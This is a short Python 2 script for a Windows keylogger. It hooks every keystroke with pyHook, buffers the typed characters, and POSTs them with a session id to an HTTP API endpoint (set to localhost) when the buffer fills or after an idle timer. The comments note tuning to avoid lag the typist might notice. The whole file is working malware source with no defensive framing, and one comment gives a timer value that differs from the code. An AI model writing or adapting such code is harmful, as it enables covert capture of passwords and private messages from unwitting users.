import sys, pyHook, pythoncom, urllib, urllib2, threading, uuid

# Globals
api_url    = 'http://localhost:8080/api'   # Setting up api url
id         = uuid.uuid1()                             # Generating unique guid for this section so it's easier to analyze later
buffer     = ''                                       # Buffer to store types and then send them
syncThread = None                                     # Thread to force sync after idle (If user stop typing and don't fill up the buffer to send the data forced send it after 15 second)


#Function to send data to api and clear the buffer
def SendData():
	global buffer,id,api_url

	data = urllib.urlencode({"id":id,"message":buffer})
	req = urllib2.Request(api_url, data)
	urllib2.urlopen(req)

	buffer = ''

	return True

# Checking keyboard input and storing it on the buffer or, when it's full, post the buffer to API
def OnKeyboardEvent(event):
	global buffer,syncThread

	buffer += chr(event.Ascii)

	if len(buffer) > 80:       # Warning: Setting up a small buffer size results in a type-in lag, causing bad user experience
		SendData()

	if syncThread != None:     # If there's a existing threat waiting to force sync cancel it
		syncThread.cancel()
	syncThread = threading.Timer(8.0, forceSync) # And then set a force sync after 15s
	syncThread.start()

	return True

# Creating another function to force sync just for code clarity
def forceSync(): 
	SendData()

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()